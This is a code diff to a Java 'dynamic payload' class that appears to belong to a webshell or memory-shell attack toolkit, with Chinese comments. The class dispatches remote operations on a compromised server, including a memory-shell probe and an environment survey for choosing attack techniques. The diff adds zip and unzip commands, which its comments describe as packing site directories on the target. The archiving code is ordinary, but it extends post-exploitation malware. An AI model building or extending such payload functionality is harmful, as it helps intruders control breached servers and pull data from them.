@@ -19,6 +19,9 @@ import java.sql.Statement;
 import java.util.ArrayList;
 import java.util.Map;
 import java.util.TreeMap;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipInputStream;
+import java.util.zip.ZipOutputStream;
 
 /**
  * FORANG Java 动态载荷。
@@ -101,6 +104,12 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
             }
             if ("mkdir".equals(op)) {
                 return mkdir(arg(args, 0));
+            }
+            if ("zip".equals(op)) {
+                return zip(arg(args, 0), arg(args, 1));
+            }
+            if ("unzip".equals(op)) {
+                return unzip(arg(args, 0), arg(args, 1));
             }
             if ("memshell_probe".equals(op)) {
                 return msProbe();
@@ -310,6 +319,178 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
             return "ERROR:创建目录失败（权限不足）";
         }
         return "OK";
+    }
+
+    /**
+     * 打包：src 可以是文件或目录，目录递归。流式写盘，不把内容读进内存。
+     *
+     * <p>entry 名统一用相对路径 + '/'（即便目标端是 Windows），这样同一个包
+     * 在 Linux/Windows 上解出来目录结构都对得上。单个文件读失败只跳过、不中断
+     * 整包——站点目录里常有被锁住的日志，为它放弃整包不值当。
+     *
+     * <p>回显与脚本载体对齐：成功是 {@code OK <字节数>}，失败以 ERROR: 开头。
+     */
+    private static String zip(String src, String dst) throws IOException {
+        if (src == null || src.length() == 0 || dst == null || dst.length() == 0) {
+            return "ERROR:缺少源路径或目标路径";
+        }
+        File in = new File(src);
+        if (!in.exists()) {
+            return "ERROR:源路径不存在: " + src;
+        }
+        File out = new File(dst);
+        File parent = out.getParentFile();
+        if (parent != null && !parent.exists() && !parent.mkdirs()) {
+            return "ERROR:创建目标目录失败（权限不足）";
+        }
+        int[] stat = new int[]{0, 0}; // [写入成功, 跳过]
+        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(out));
+        try {
+            if (in.isDirectory()) {
+                zipDir(in, in, zos, stat);
+            } else {
+                zipFile(in, in.getName(), zos, stat);
+            }
+        } finally {
+            zos.close();
+        }
+        if (stat[0] == 0 && stat[1] == 0) {
+            return "ERROR:没有可打包的文件（目录为空或不可读）: " + src;
+        }
+        return "OK " + out.length();
+    }
+
+    private static void zipDir(File root, File dir, ZipOutputStream zos, int[] stat) throws IOException {
+        File[] kids = dir.listFiles();
+        if (kids == null) {
+            return; // 不可读目录：交给上层按「空包」判错
+        }
+        if (kids.length == 0 && !dir.getAbsolutePath().equals(root.getAbsolutePath())) {
+            // 空目录也要落一条 entry，否则解包后这个目录直接消失
+            zos.putNextEntry(new ZipEntry(relPath(root, dir) + "/"));
+            zos.closeEntry();
+            stat[0]++;
+            return;
+        }
+        for (int i = 0; i < kids.length; i++) {
+            File k = kids[i];
+            if (k.isDirectory()) {
+                zipDir(root, k, zos, stat);
+            } else {
+                zipFile(k, relPath(root, k), zos, stat);
+            }
+        }
+    }
+
+    private static void zipFile(File f, String name, ZipOutputStream zos, int[] stat) {
+        FileInputStream fis = null;
+        try {
+            fis = new FileInputStream(f);
+            zos.putNextEntry(new ZipEntry(name));
+            byte[] buf = new byte[8192];
+            int n;
+            while ((n = fis.read(buf)) > 0) {
+                zos.write(buf, 0, n);
+            }
+            zos.closeEntry();
+            stat[0]++;
+        } catch (IOException e) {
+            stat[1]++;
+            try {
+                zos.closeEntry();
+            } catch (IOException ignore) {
+                // 条目本身没写成功，closeEntry 再抛也只能放弃
+            }
+        } finally {
+            if (fis != null) {
+                try {
+                    fis.close();
+                } catch (IOException ignore) {
+                    // 关流失败不影响已写入的内容
+                }
+            }
+        }
+    }
+
+    /** 相对 root 的路径，统一成 '/' 分隔；不在 root 下就退化成文件名。 */
+    private static String relPath(File root, File f) {
+        String base = root.getAbsolutePath();
+        String full = f.getAbsolutePath();
+        if (full.startsWith(base)) {
+            String r = full.substring(base.length());
+            while (r.startsWith("/") || r.startsWith("\\")) {
+                r = r.substring(1);
+            }
+            return r.replace('\\', '/');
+        }
+        return f.getName();
+    }
+
+    /**
+     * 解包到 dst（不存在就建）。
+     *
+     * <p>每个 entry 规范化后必须仍然落在 dst 之内，挡掉 {@code ../} 与绝对路径写法——
+     * 攻击者可控的压缩包不该能往站点目录外面写文件。条目名是 GBK 时按平台默认编码
+     * 猜不回来，但至少不会写错位置。
+     */
+    private static String unzip(String src, String dst) throws IOException {
+        if (src == null || src.length() == 0 || dst == null || dst.length() == 0) {
+            return "ERROR:缺少源路径或目标路径";
+        }
+        File in = new File(src);
+        if (!in.isFile()) {
+            return "ERROR:压缩包不存在: " + src;
+        }
+        File out = new File(dst);
+        if (!out.exists() && !out.mkdirs()) {
+            return "ERROR:创建解压目录失败（权限不足）";
+        }
+        String baseCanon = out.getCanonicalPath();
+        String prefix = baseCanon.endsWith(File.separator) ? baseCanon : baseCanon + File.separator;
+        int ok = 0;
+        int skip = 0;
+        ZipInputStream zis = new ZipInputStream(new FileInputStream(in));
+        try {
+            ZipEntry e;
+            while ((e = zis.getNextEntry()) != null) {
+                String name = e.getName() == null ? "" : e.getName().replace('\\', '/');
+                if (name.length() == 0) {
+                    skip++;
+                    continue;
+                }
+                File target = new File(out, name);
+                String canon = target.getCanonicalPath();
+                if (!canon.equals(baseCanon) && !canon.startsWith(prefix)) {
+                    skip++; // Zip Slip：写出 dst 之外，直接丢弃
+                    continue;
+                }
+                if (e.isDirectory()) {
+                    if (!target.exists()) {
+                        target.mkdirs();
+                    }
+                } else {
+                    File p = target.getParentFile();
+                    if (p != null && !p.exists()) {
+                        p.mkdirs();
+                    }
+                    FileOutputStream fos = new FileOutputStream(target);
+                    try {
+                        byte[] buf = new byte[8192];
+                        int n;
+                        while ((n = zis.read(buf)) > 0) {
+                            fos.write(buf, 0, n);
+                        }
+                    } finally {
+                        fos.close();
+                    }
+                    ok++;
+                }
+                zis.closeEntry();
+            }
+        } finally {
+            zis.close();
+        }
+        return "OK " + ok + (skip > 0 ? " (跳过 " + skip + " 个异常条目)" : "");
     }
 
     /** 目标环境信息，用于连接后快速判断可用手法。 */
